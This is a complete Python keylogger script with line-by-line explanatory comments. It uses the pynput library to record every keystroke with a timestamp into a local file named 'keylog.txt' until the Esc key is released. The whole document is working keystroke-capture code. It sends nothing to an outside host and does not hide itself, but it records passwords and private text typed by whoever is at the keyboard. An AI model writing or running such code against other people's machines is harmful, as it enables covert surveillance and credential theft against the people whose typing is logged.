import pynput  # Import the pynput library for controlling and monitoring input devices
from pynput.keyboard import Key, Listener  # Import Key and Listener classes from pynput.keyboard
import logging  # Import the logging module for logging keystrokes to a file

# Set up logging configuration
log_file = "keylog.txt"  # Define the log file name
# Configure logging to write to log_file, set the logging level to DEBUG, and specify the log message format
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define a callback function to be called when a key is pressed
def on_press(key):
    try:
        logging.info(str(key))  # Log the key press event as a string
    except Exception as e:
        print(f"Error logging key: {e}")  # Print any exception that occurs during logging

# Define a callback function to be called when a key is released
def on_release(key):
    if key == Key.esc:
        # Stop listener if the 'esc' key is released
        return False

# Set up the listener to monitor keystrokes
# with statement ensures the listener is properly cleaned up after use
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Start the listener and wait for it to complete
